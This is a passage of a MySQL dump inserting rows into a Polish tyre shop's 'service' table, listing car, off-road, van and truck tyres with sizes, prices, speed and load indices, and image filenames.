(94, 56, 'Kelly ST 145/70R13 71T', '', '', 110.00, '20130207210643_20120217122227_kelly_st_145_70r13_tp_5948402054860424208baaaaaaaaaaaaaaaaaaaaaaa.jpg', '2012-02-02 15:18:28', '2013-08-29 20:36:01', 'N', 'Y', 'ST', 'Osobowe', 'Kelly', 1, '145/70R13', 'T - do 190 km/h', 0, '', '71 -	do 345 kg', 1, '', '', '', '', '', '', '', ''),
(95, 56, 'Kelly ST 155/70R13 75T', '', '', 120.00, '20130305161555_20130207210643_20120217122227_kelly_st_145_70r13_tp_5948402054860424208baaaaaaaaaaaaaaaaaaaaaaa.jpg', '2012-02-02 15:24:19', '2013-08-29 20:36:12', 'N', 'Y', 'ST', 'Osobowe', 'Kelly', 1, '155/70R13', 'T - do 190 km/h', 0, '', '75 - do 385 kg', 1, '', '', '', '', '', '', '', ''),
(96, 56, 'Kelly ST 165/70R13 79T', '', '', 130.00, '20120202163013_kelly_st_145_70r13_tp_5948402054860424208b.jpg', '2012-02-02 15:28:52', '2013-04-11 11:32:50', 'N', 'Y', 'ST', 'Osobowe', 'Kelly', 1, '165/70R13', 'T - do 190 km/h', 0, '', '79 - do 437 kg', 1, '', '', '', '', '', '', '', ''),
(97, 56, 'Riken ALLSTAR 2 175/70R13 82T', '', '', 0.00, '20120203090426_riken_allstar2_macro.jpg', '2012-02-02 15:34:00', '2012-02-03 08:04:26', 'N', 'Y', 'ALLSTAR 2', 'Osobowe', 'Riken', 1, '175/70R13', 'T - do 190 km/h', 0, '', '82 - do 475 kg', 1, '', '', '', '', '', '', '', ''),
(98, 56, 'Kelly ST 175/70R13 79T', '', '', 140.00, '20130314115827_20120208105911_kelly_st_1.jpg', '2012-02-02 15:40:00', '2013-04-11 11:23:50', 'N', 'Y', 'ST', 'Osobowe', 'Kelly', 1, '175/70R13', 'T - do 190 km/h', 0, '', '79 - do 437 kg', 1, '', '', '', '', '', '', '', ''),
(99, 56, 'Dębica PASSIO 155/80R13 79T', '', '', 135.00, '20130314115441_photo_c6f5fb6f_632e_4c76_9f21_fc8904f47216_for_zoom.jpg', '2012-02-02 15:42:46', '2013-04-11 11:24:34', 'N', 'Y', 'PASSIO ', 'Osobowe', 'Dębica', 1, '155/80R13', 'T - do 190 km/h', 0, '', '79 - do 437 kg', 1, '', '', '', '', '', '', '', ''),
(100, 56, 'Diplomat T 165/70R14 81T', '', '', 150.00, '20130411131923_20120208105911_kelly_st_1.jpg', '2012-02-02 15:43:43', '2013-04-11 11:19:23', 'N', 'Y', '---', 'Osobowe', 'Diplomat ', 1, '165/70R14 ', 'T - do 190 km/h', 0, '', '81 do 462 kg', 1, '', '', '', '', '', '', '', ''),
(101, 56, 'Kelly ST 175/65R14 82T', '', '', 160.00, '20120217122041_kelly_st_1.jpg', '2012-02-02 15:44:47', '2013-04-11 10:46:09', 'N', 'Y', 'ST', 'Osobowe', 'Kelly', 1, '175/70R14', 'T - do 190 km/h', 0, '', '82 - do 475 kg', 1, '', '', '', '', '', '', '', ''),
(102, 56, 'Kelly ST 175/70R14 84T', '', '', 170.00, '20130411124720_20120208105911_kelly_st_1.jpg', '2012-02-02 15:45:06', '2013-07-12 18:48:09', 'N', 'Y', 'ST', 'Osobowe', 'Kelly', 1, '175/70R14', 'T - do 190 km/h', 0, '', '84 - do 500 kg', 1, '', '', '', '', '', '', '', ''),
(103, 56, 'Kelly ST 185/60R14 84T', '', '', 170.00, '20130314102810_20120208105911_kelly_st_1.jpg', '2012-02-02 15:49:19', '2013-04-11 11:31:32', 'N', 'Y', 'ST', 'Osobowe', 'Kelly', 1, '185/60R14', 'T - do 190 km/h', 0, '', '84 - do 500 kg', 1, '', '', '', '', '', '', '', ''),
(104, 56, 'Riken ALLSTAR2 185/65R14 86T', '', '', 0.00, '20130314112729_20120203090426_riken_allstar2_macro.jpg', '2012-02-02 15:50:31', '2013-03-14 10:27:29', 'N', 'Y', 'ALLSTAR2', 'Osobowe', 'Riken', 1, '185/65R14 ', 'T - do 190 km/h', 0, '', '86 - do 530 kg', 1, '', '', '', '', '', '', '', ''),
(105, 56, 'Kelly ST 185/65R14 86T', '', '', 170.00, '20130312141435_20120210113129_kelly_st_1.jpg', '2012-02-02 15:50:53', '2013-04-11 11:30:53', 'N', 'Y', 'ST', 'Osobowe', 'Kelly', 1, '185/65R14', 'T - do 190 km/h', 0, '', '86 - do 530 kg', 1, '', '', '', '', '', '', '', ''),
(106, 56, 'Kelly ST 185/70R14 88T', '', '', 185.00, '20120208110009_kelly_st_1.jpg', '2012-02-02 15:51:22', '2013-07-12 18:48:54', 'N', 'Y', 'ST', 'Osobowe', 'Kelly', 1, '185/70R14', 'T - do 190 km/h', 0, '', '88 - do 560 kg', 1, '', '', '', '', '', '', '', ''),
(107, 56, 'Matador MP44 185/65R15 88T', '', '', 180.00, '20130329173005_f_matador_mp_44_elite_3_195_65r15_95h.jpg', '2012-02-02 15:52:44', '2013-03-29 16:30:05', 'N', 'Y', 'MP44', 'Osobowe', 'Matador', 1, '185/65 R15', 'T - do 190 km/h', 0, '', '88 - do 560 kg', 1, '', '', '', '', '', '', '', ''),
(108, 56, 'Kelly HP 185/65R15 88T', '', '', 185.00, '20130314114905_20120208105911_kelly_st_1.jpg', '2012-02-02 15:53:04', '2013-03-27 12:23:28', 'N', 'Y', 'HP', 'Osobowe', 'Kelly', 1, '185/65 R15', 'T - do 190 km/h', 0, '', '88 - do 560 kg', 1, '', '', '', '', '', '', '', ''),
(109, 80, '---', '', '', 180.00, '20130305121117_matador_mp_44_elite_3_185_65_r15_88t.jpg', '2012-02-02 15:53:28', '2013-04-11 10:48:06', 'N', 'Y', 'MP44', 'Osobowe', 'Matador', 1, '185/65R15 ', 'T - do 190 km/h', 0, '', '88 - do 560 kg', 1, '', '', '', '', '', '', '', ''),
(110, 56, 'Diplomat 195/60R15 88H', '', '', 190.00, '20130730095539_20130206130705_kelly_hp_195_60r15.jpg', '2012-02-02 15:54:06', '2013-07-30 07:55:39', 'N', 'Y', '---', 'Osobowe', 'Diplomat', 1, '195/60R15', 'H - do 210 km/h', 0, '', '88 - do 560 kg', 1, '', '', '', '', '', '', '', ''),
(111, 56, 'Kelly HP 195/65R15 91H', '', '', 190.00, '20130206130705_kelly_hp_195_60r15.jpg', '2012-02-02 15:55:07', '2013-03-07 10:41:30', 'N', 'Y', 'HP', 'Osobowe', 'Kelly ', 1, '195/65R15', 'H - do 210 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(112, 56, 'Kleber DYNAXER HP3 195/65R15 91H', '', '', 220.00, '20130208120833_kleber_dynaxer_hp3_195_65r15_91h.jpg', '2012-02-03 07:41:03', '2013-03-12 13:23:14', 'N', 'Y', ' DYNAXER HP3', 'Osobowe', 'Kleber', 1, '195/65R15', 'H - do 210 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(113, 56, 'Dębica PRESTO 195/65R15 91H', '', '', 200.00, '20130210150933_20130208122416_p__2__266__101__photo_1993f9b1_5b1a_4adf_81ab_2c71696f5d0f_original_size.jpg', '2012-02-03 07:41:19', '2013-03-12 13:15:07', 'N', 'Y', 'PRESTO', 'Osobowe', 'Dębica', 1, '195/65R15', 'H - do 210 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(114, 80, 'Kelly HP 205/60R15 91H', '', '', 260.00, '', '2012-02-03 07:42:57', '2013-04-11 12:25:47', 'N', 'Y', 'HP', 'Osobowe', 'Kelly', 1, ' 205/55R16', 'H - do 210 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(186, 80, '215//75R16', '', '', 0.00, '', '2013-03-15 08:33:59', '0000-00-00 00:00:00', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(115, 56, 'Kelly HP 205/55R16 91H', '', '', 250.00, '20130315082250_20120203084843_130x150_kelly_kelly_hpdf.jpg', '2012-02-04 10:57:49', '2013-03-27 14:14:47', 'N', 'Y', 'HP', 'Osobowe', 'Kelly', 1, '205/55R16', 'H - do 210 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(116, 56, ' Dębica PRESTO 205/55R16 91V', '', '', 260.00, '20130208122416_p__2__266__101__photo_1993f9b1_5b1a_4adf_81ab_2c71696f5d0f_original_size.jpg', '2012-02-04 10:58:17', '2013-03-14 09:17:37', 'N', 'Y', 'PRESTO', 'Osobowe', 'Dębica', 1, '205/55R16', 'V - do 240 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(117, 56, 'Barum Bravuris 2 205/55R16 91V', '', '', 270.00, '20130315082109_20120209125459_barum_bravuris_2_205_55_r16.jpg', '2012-02-04 10:58:28', '2013-03-27 14:14:28', 'N', 'Y', 'Bravuris 2', 'Osobowe', 'Barum', 1, '205/55R16', 'V - do 240 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(118, 56, 'Dębica PRESTO 215/55R16 93V', '', '', 350.00, '20130312141324_20130208122416_p__2__266__101__photo_1993f9b1_5b1a_4adf_81ab_2c71696f5d0f_original_size.jpg', '2012-02-04 10:59:06', '2013-03-12 13:13:24', 'N', 'Y', 'PRESTO', 'Osobowe', 'Dębica', 1, '215/55R16', 'V - do 240 km/h', 0, '', '93 - do 650 kg', 1, '', '', '', '', '', '', '', ''),
(119, 56, 'Matador MP44 225/55R16 95V', '', '', 380.00, '20130411143048_f_matador_mp_44_elite_3_195_65r15_95h.jpg', '2012-02-04 11:05:21', '2013-04-11 12:30:48', 'N', 'Y', 'MP44', 'Osobowe', 'Matador', 1, '225/55R16', 'V - do 240 km/h', 0, '', '95 - do 690 kg', 1, '', '', '', '', '', '', '', ''),
(120, 56, 'Barum Bravuris 2 205/50R17 89V', '', '', 300.00, '20130411142723_20130315082109_20120209125459_barum_bravuris_2_205_55_r16.jpg', '2012-02-04 11:07:51', '2013-04-11 12:27:41', 'N', 'Y', 'Bravuris 2', 'Osobowe', 'Barum', 1, '205/50R17', 'V - do 240 km/h', 0, '', '89 - do 580 kg', 1, '', '', '', '', '', '', '', ''),
(121, 56, 'Matador MP44 215/60R16 99H', '', '', 350.00, '20130718205901_pobrane.jpg', '2012-02-04 11:09:35', '2013-07-18 18:59:01', 'N', 'Y', 'MP44', 'Osobowe', 'Matador', 1, '215/60R16', 'H - do 210 km/h', 0, '', '99 - do 775 kg', 1, '', '', '', '', '', '', '', ''),
(122, 56, 'Matador MP46 225/45R17 94Y', '', '', 370.00, '20130410191018_20130306101755_20130210154850_matador_mp46_235_45_r17_94_y.jpg', '2012-02-04 11:10:00', '2013-04-10 17:10:36', 'N', 'Y', 'MP46', 'Osobowe', 'Matador', 1, '225/45R17 ', 'Y - do 300 km/h', 0, '', '94 - do 670 kg', 1, '', '', '', '', '', '', '', ''),
(123, 56, 'Sailun Atrezzo Z4+AS 225/45R17 94W', '', '', 280.00, '20130410191205_20130306101534_sailun_245_45r17_sailun_atrezzo_z4_as_99_w_xl_rf.jpg', '2012-02-04 11:10:23', '2013-04-10 17:12:43', 'N', 'Y', 'Atrezzo Z4+AS', 'Osobowe', 'Sailun ', 1, '225/45R17', 'W - do 270 km/h', 0, '', '94 - do 670 kg', 1, '', '', '', '', '', '', '', ''),
(124, 56, 'Kingstar SK10 225/55R17 101W', '', '', 350.00, '20130717143844_kingstar_sk10_225_40_r18_92_w.jpg', '2012-02-04 11:12:08', '2013-07-17 12:38:44', 'N', 'Y', 'SK10 ', 'Osobowe', 'Kingstar', 1, '225/55R17 ', 'W - do 270 km/h', 0, '', '101 - do 825 kg', 1, '', '', '', '', '', '', '', ''),
(125, 80, '225/40R18', '', '', 0.00, '', '2012-02-04 11:13:13', '2013-07-19 09:41:30', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(126, 56, 'Sailun Atrezzo ZS+ 225/45R18 95W', '', '', 310.00, '20130410185020_20130306102511_1343121736_49991700.jpg', '2012-02-04 11:22:09', '2013-04-10 16:50:37', 'N', 'Y', 'Atrezzo ZS+', 'Osobowe', 'Sailun ', 1, '225/45R18', 'W - do 270 km/h', 0, '', '95 - do 690 kg', 1, '', '', '', '', '', '', '', ''),
(127, 56, 'Nexen 245/40R18 97Y', '', '', 420.00, '20130719114959_1686.jpg', '2012-02-04 11:25:10', '2013-07-19 09:49:59', 'N', 'Y', 'N6000', 'Osobowe', 'Nexen', 1, '245/40R18', 'Y - do 300 km/h', 0, '', '97 - do 730 kg', 1, '', '', '', '', '', '', '', ''),
(128, 80, 'opony terenowe', '', '', 0.00, '', '2012-02-04 11:40:49', '2012-02-04 11:40:56', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(129, 91, 'Matador MP71 205/70R15 95T', '', '', 290.00, '20130327205746_matador_mp71_235_75r15.jpg', '2012-02-08 13:52:18', '2013-08-22 17:55:30', 'N', 'Y', 'MP71', 'Terenowe', 'Matador', 1, '205/70 R15', 'T - do 190 km/h', 0, '', '95 - do 690 kg', 1, '', '', '', '', '', '', '', ''),
(130, 91, 'Matador MP71 235/75R15 108T XL RBL', '', '', 370.00, '20130327143625_matador_mp71_235_75r15.jpg', '2012-02-09 09:17:06', '2013-08-22 17:55:46', 'N', 'Y', 'MP71', 'Terenowe', 'Matador', 1, '235/75R15', 'T - do 190 km/h', 0, '', '108 - do 1000 kg', 1, '', '', '', '', '', '', '', ''),
(131, 91, 'Matador MP71 215/65R16 98H', '', '', 0.00, '20130816102324_20130327143625_matador_mp71_235_75r15.jpg', '2012-02-09 09:30:15', '2013-08-22 17:56:00', 'N', 'Y', 'MP71', 'Terenowe', 'Matador', 1, '215/70R16', 'H - do 210 km/h', 0, '', '98 - do 750 kg', 1, '', '', '', '', '', '', '', ''),
(132, 91, 'Barum Bravuris 4x4 215/70R16 100H', '', '', 360.00, '20120209121559_barum_bravuris_4x4_205_70_r15.jpg', '2012-02-09 09:30:38', '2013-08-22 17:56:12', 'N', 'Y', 'Bravuris 4x4', 'Terenowe', 'Barum', 1, '215/70R16', 'H - do 210 km/h', 0, '', '100 - do 800 kg', 1, '', '', '', '', '', '', '', ''),
(133, 91, 'Barum Bravuris 4x4 235/70R16 106H', '', '', 360.00, '20130730165723_20120209121559_barum_bravuris_4x4_205_70_r15.jpg', '2012-02-09 09:30:54', '2013-08-22 17:56:22', 'N', 'Y', 'Bravuris 4x4', 'Terenowe ', 'Barum', 1, '235/70R16', '106 - do 960 kg', 0, '', 'H - do 210 km/h', 1, '', '', '', '', '', '', '', ''),
(134, 91, 'Sailun TERRAMAX CVR 235/70R16 106H', '', '', 320.00, '20130730193700_sailun_terramax_cvr_235_70_r16_106h_805791_3639_197508_1_feed.jpg', '2012-02-11 11:58:00', '2013-08-22 17:56:40', 'N', 'Y', 'TERRAMAX CVR', 'Terenowe ', 'Sailun ', 1, '235/70R16', 'H - do 210 km/h', 0, '', '106 - do 950 kg', 1, '', '', '', '', '', '', '', ''),
(135, 80, '', '', '', 0.00, '', '2012-02-11 12:05:54', '2014-01-02 14:44:32', 'Y', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(136, 80, 'Cięzarowe205/75 R17,5', '', '', 0.00, '20120211132450_sava_205_75r175_124_122m_tl_avant_a3_nakladni_pneu.jpg', '2012-02-11 12:06:16', '2012-02-11 12:28:22', 'N', 'Y', '', 'Cięzarowe-naczepa', '', 1, '205/75R17,5', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(137, 80, '225/75 R17''5', '', '', 0.00, '', '2012-02-11 12:11:46', '0000-00-00 00:00:00', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(138, 76, 'Sava Orjak O3 205/75R17.5 124M', '', '', 0.00, '20120215144232_sava_205_75r175_124_122m_tl_avant_a3_nakladni_pneu.jpg', '2012-02-11 12:12:09', '2012-03-06 14:00:28', 'N', 'Y', 'Orjak O3', 'Cięzarowe-napęd', 'Sava', 1, '205/75R17.5', '124 - do 1600 kg', 0, '', 'M - do 130 km/h', 1, '', '', '', '', '', '', '', ''),
(139, 76, 'Kormoran T 215/75R17.5 135J ', '', '', 0.00, '20130322141828_pobrane.jpg', '2012-02-11 12:12:42', '2013-03-22 14:09:57', 'N', 'Y', '---', 'Cięzarowe', 'Kormoran', 1, '215/75R17.5', 'J - do 100 km/h', 0, '', '135 - do 2180 kg', 1, '', '', '', '', '', '', '', ''),
(140, 80, '225/75 R17''5', '', '', 0.00, '', '2012-02-11 12:12:59', '2012-02-19 19:53:07', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(141, 76, 'Firestone FS400 235/75R17.5 132/130M', '', '', 0.00, '20130315094302_270x270_firestone_fs400.jpg', '2012-02-11 12:14:04', '2013-03-15 08:45:59', 'N', 'Y', 'FS400 ', 'Ciężarowe', 'Firestone', 1, '235/75R17.5 ', 'M - do 130 km/h', 0, '', '132/130', 1, '', '', '', '', '', '', '', ''),
(142, 80, 'R17', '', '', 0.00, '', '2012-02-11 12:16:02', '2012-02-20 12:55:26', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(143, 80, 'r17', '', '', 0.00, '', '2012-02-11 12:16:21', '2014-01-02 14:44:40', 'Y', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(144, 80, 'r17', '', '', 0.00, '', '2012-02-11 12:20:57', '2012-02-20 12:56:03', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(145, 80, '265/70R19.5', '', '', 0.00, '', '2012-02-20 12:57:38', '2014-01-02 14:44:19', 'Y', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(146, 80, '11.00R20', '', '', 0.00, '', '2012-02-20 13:01:20', '0000-00-00 00:00:00', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(147, 80, '10.00R20', '', '', 0.00, '', '2012-02-20 13:01:39', '0000-00-00 00:00:00', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(148, 80, 'OPONA 295/80R22.5 <152/148M> TL KORMORAN F', '', '', 0.00, '', '2012-02-20 13:03:16', '2012-02-20 13:07:34', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(149, 80, ' 315/70 R22.5', '', '', 0.00, '', '2012-02-20 13:03:49', '2014-01-02 14:43:51', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(150, 76, 'Sava Orjak 4 315/70 R22.5 154M', '', '', 0.00, '20130316104349_315_70_r225_sava_orjak_o3.jpg', '2012-02-20 13:04:04', '2013-03-22 13:13:36', 'N', 'Y', 'Orjak O4', 'Ciężarowe-napęd', 'Sava', 1, '315/70 R22.5', 'M - do 130 km/h', 0, '', '154 do - 3750 kg', 1, '', '', '', '', '', '', '', ''),
(151, 80, '315/80R22.5', '', '', 0.00, '', '2012-02-20 13:05:11', '2014-01-02 14:43:19', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(152, 76, 'Sava Avant 4 315/80R22.5 154M ', '', '', 0.00, '20130315145401_sava_avant_4_295_80_r22_5_152_148_m.jpg', '2012-02-20 13:48:45', '2013-03-22 13:14:50', 'N', 'Y', 'Avant 4', 'Ciężarowe', 'Sava', 1, '315/80R22.5', 'M - do 130 km/h', 0, '', '154 do - 3750 kg', 1, '', '', '', '', '', '', '', ''),
(153, 76, 'Continental HTR2  385/65R22.5 160K', '', '', 0.00, '20130322140928_continental_htr2_385_65_r22_5_160_k.jpg', '2012-02-20 13:49:09', '2013-03-22 13:09:28', 'N', 'Y', 'HTR2', 'Ciężarowe-naczepa', 'Continental', 1, '385/65R22.5', 'K - do 110 km/h', 0, '', '160 - do 4500 kg', 1, '', '', '', '', '', '', '', ''),
(154, 76, 'Kormoran T 385/65R22.5 160J', '', '', 0.00, '20130312124256_20120219174547_r_id_d140nta7af40nta7dv5odhrwoi8vas53cc5wbc9hl2kvemfrdxb5my9ycw0vodcyms94x28xmjezotkuanbno21edhj1zttwxnrydwu7df5qcgc7c156ywt1chk0o2z0xje=.jpg', '2012-02-20 13:49:38', '2013-03-22 13:15:25', 'N', 'Y', '---', 'Ciężarowe-naczepa', 'Kormoran', 1, '385/65 R22.5', '160 - do 4500 kg', 0, '', 'J - do 100 km/h', 1, '', '', '', '', '', '', '', ''),
(155, 76, 'Sava Cargo C3 plus 385/65R22.5 160K', '', '', 0.00, '20130315095626_sava_cargo_c3_plus_385_65r22_5_160_j.jpg', '2012-02-20 13:50:06', '2013-03-22 13:15:48', 'N', 'Y', 'Cargo C3 plus', 'Ciężarowe', 'Sava', 1, '385/65R22.5', 'K - do 110 km/h', 0, '', '160 - do 4500 kg', 1, '', '', '', '', '', '', '', ''),
(156, 89, 'Gał Gum Steel 155/70/13 75T', '', '', 100.00, '20120807162100_1332246904_155_70_13.jpg', '2012-03-22 14:27:27', '2013-02-07 12:04:40', 'N', 'Y', 'Steel', 'Osobowe', 'Gał Gum', 1, '155/70R13 ', 'T - do 190 km/h', 0, '', '75 - do 385 kg', 1, '', '', '', '', '', '', '', ''),
(157, 89, 'Gał Gum Steel 165/70/13 79T', '', '', 100.00, '20120807162307_1332246904_155_70_13.jpg', '2012-08-07 14:22:52', '2013-02-07 12:07:59', 'N', 'Y', 'Steel', 'Osobowe', 'Gał Gum', 1, '165/70/13', 'T - do 190 km/h', 0, '', '79 - do 437kg', 1, '', '', '', '', '', '', '', ''),
(158, 89, 'Gał Gum STEEL 175/70/13 82T', '', '', 110.00, '20120807162408_1332246904_155_70_13.jpg', '2012-08-07 14:23:56', '2013-02-07 12:09:37', 'N', 'Y', 'Steel', 'Osobowe', 'Gał Gum', 1, '175/70R13', 'T - do 190 km/h', 0, '', '82 - do 475', 1, '', '', '', '', '', '', '', ''),
(159, 80, '155/80 R13', '', '', 0.00, '', '2012-08-07 14:25:12', '2013-02-07 08:59:03', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(160, 89, ' Gał Gum  175/65/14 91S', '', '', 0.00, '20130207140829_1332247943_175_65_14.jpg', '2012-08-07 14:26:03', '2013-02-07 13:18:20', 'N', 'Y', ' ---', 'Osobowe', 'Gał Gum', 1, '175/65R14', 'S - do 180 km\\h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(161, 89, 'Gał Gum STEEL 175/70R14 84T', '', '', 120.00, '20130207203153_1332246904_155_70_13_(1).jpg', '2012-08-10 10:08:38', '2013-02-10 14:02:22', 'N', 'Y', 'Steel', 'Osobowe', 'Gał Gum', 1, '175/70R14', 'T - do 190 km/h', 0, '', '84 - do 500 kg', 1, '', '', '', '', '', '', '', ''),
(162, 89, 'Gał Gum 185/60R14 88T', '', '', 130.00, '20130207140009_1332248660_185_60_14aa.jpg', '2012-08-10 10:09:00', '2013-02-07 19:37:15', 'N', 'Y', ' ---', 'Osobowe', 'Gał Gum', 1, '185/60R14', 'T - do 190 km/h', 0, '', '88 - do 560 kg', 1, '', '', '', '', '', '', '', ''),
(163, 89, 'Gał Gum Prime 185/65R14 88T', '', '', 125.00, '20130207091919_1332248728_185_65_14.jpg', '2012-08-10 10:09:12', '2013-02-10 14:01:43', 'N', 'Y', 'Prime', 'Osobowe', 'Gał Gum', 1, '185/65R14', 'T - do 190 km/h', 0, '', '88 - do 560 kg', 1, '', '', '', '', '', '', '', ''),
(164, 89, 'Gał Gum 185/70R14 91T', '', '', 120.00, '20130207100403_1332247943_175_65_14.jpg', '2012-08-10 10:09:25', '2013-02-07 19:35:56', 'N', 'Y', '---', 'Osobowe', 'Gał Gum', 1, '185/70R14', 'T - do 190 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(165, 80, '', '', '', 0.00, '', '2012-08-10 10:13:53', '2013-02-07 12:57:00', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(166, 89, 'Gał Gum GALAXIE  185/65R15 91T', '', '', 130.00, '20130207204233_1360160700_185_65_15.jpg', '2012-08-10 10:15:44', '2013-02-07 19:42:33', 'N', 'Y', 'GALAXIE ', 'Osobowe', 'Gał Gum', 1, '185/65R15', 'T - do 190 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(167, 89, 'Gał Gum PILOT SPORT 195/50R15 82V', '', '', 130.00, '20130207132820_1332248773_195_50_15.jpg', '2012-08-10 10:16:36', '2013-02-10 13:59:42', 'N', 'Y', 'PILOT SPORT', 'Osobowe', 'Gał Gum', 1, '195/50R15', 'V - do 240 km/h', 0, '', '82 - do 475', 1, '', '', '', '', '', '', '', ''),
(168, 80, '195/55R15', '', '', 0.00, '', '2012-08-10 10:16:59', '2013-02-07 09:01:33', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', '');
INSERT INTO `service` (`id_service`, `id_catalog`, `name`, `short_content`, `content`, `price`, `picture`, `added`, `modified`, `deleted`, `active`, `cap`, `destination`, `producer`, `season`, `size`, `speed_index`, `agricultural`, `pr`, `maxload`, `id_category_type`, `warranty`, `tension`, `capacity`, `power_starter`, `diameter_wheel`, `width_wheel`, `spacing_screw`, `seating`) VALUES
(169, 89, 'Gał Gum Topline 195/60R15 88H', '', '', 140.00, '20130207091415_1332248810_195_60_15.jpg', '2012-08-10 10:17:21', '2013-02-07 12:19:43', 'N', 'Y', 'Topline', 'Osobowe', 'Gał Gum', 1, '195/60R15', 'H - do 210 km/h', 0, '', '88 - do 560 kg', 1, '', '', '', '', '', '', '', ''),
(170, 89, 'Gał Gum PRIME 195/65R15 91T', '', '', 130.00, '20120810131950_1332248728_185_65_14.jpg', '2012-08-10 10:17:43', '2013-04-10 16:45:53', 'N', 'Y', 'PRIME', 'Osobowe', 'Gał Gum', 1, '195/65R15', 'T - do 190 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(171, 80, 'Gał Gum PILOT SPORT 205/60 R15 82V', '', '', 0.00, '20130315093826_1332248773_195_50_15.jpg', '2012-08-10 10:18:29', '2013-03-15 08:38:26', 'N', 'Y', '', 'Osobowe', 'Gał Gum', 1, '205/60 R15', 'V - do 240 km/h', 0, '', '82 - do 475 kg', 1, '', '', '', '', '', '', '', ''),
(172, 80, '205/65R15', '', '', 0.00, '', '2012-08-10 11:16:04', '2013-02-07 09:02:20', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(173, 89, 'Gał Gum Topline 205/55R16 91H', '', '', 150.00, '20120810131840_1332248810_195_60_15.jpg', '2012-08-10 11:16:30', '2013-02-07 12:30:14', 'N', 'Y', 'Topline', 'Osobowe', 'Gał Gum', 1, '205/55r16', 'H - do 210 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(174, 89, 'Profil PROSPORT 225/45R17 91V', '', '', 0.00, '20130210191930_prosport[10].jpg', '2013-02-10 15:14:56', '2013-02-10 18:19:30', 'N', 'Y', 'PROSPORT', 'Osobowe', 'Profil', 1, '225/45R17', 'V - do 240 km/h', 0, '', '91 - do 615 kg', 1, '', '', '', '', '', '', '', ''),
(175, 75, 'Matador MPS330 185R14C  [102/100]Q', '', '', 250.00, '20130730200419_20130312125228_20130306095542_20130220192522_1158.jpg', '2013-03-05 14:06:12', '2013-07-30 18:04:29', 'N', 'Y', 'MPS330', 'Dostawcze', 'Matador', 1, '185R14C', 'Q - do 160 km/h', 0, '', '[102/100]', 1, '', '', '', '', '', '', '', ''),
(176, 75, 'Matador MPS330 195R14C 106R', '', '', 280.00, '20130312125228_20130306095542_20130220192522_1158.jpg', '2013-03-05 14:06:24', '2013-07-30 18:08:18', 'N', 'Y', 'MPS330', 'Dostawcze', 'Matador', 1, '195R14C', 'R - do 170 km/h', 0, '', '106 - do 950 kg', 1, '', '', '', '', '', '', '', ''),
(177, 80, '205/65 R15C', '', '', 0.00, '', '2013-03-05 14:07:22', '2013-03-05 15:09:31', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(178, 75, 'Sava Trenta 195/70R15C 104R', '', '', 280.00, '20130305163532_20120204124604_353.jpg', '2013-03-05 14:09:38', '2013-03-28 12:40:10', 'N', 'Y', 'Trenta ', 'Dostawcze', 'Sava', 1, '195/70R15C ', 'R - do 170 km/h', 0, '', '104 - do 900 kg', 1, '', '', '', '', '', '', '', ''),
(179, 75, 'Matador MPS320 195/70R15C 104R', '', '', 260.00, '20130424203836_20130306095542_20130220192522_1158.jpg', '2013-03-05 14:10:20', '2013-04-24 18:38:36', 'N', 'Y', 'MPS320 ', 'Dostawcze', 'Matador', 1, '195/70R15C', 'R - do 170 km/h', 0, '', '104 - do 900 kg', 1, '', '', '', '', '', '', '', ''),
(180, 75, 'Sailun COMMERCIO VX1 205/70R15C 106R', '', '', 270.00, '20130328150143_20130328095043_1276_1391_large.jpg', '2013-03-05 14:11:13', '2013-03-28 14:01:50', 'N', 'Y', 'COMMERCIO VX1', 'Dostawcze', 'Sailun ', 1, '205/70R15C', 'R - do 170 km/h', 0, '', '104 - do 900 kg', 1, '', '', '', '', '', '', '', ''),
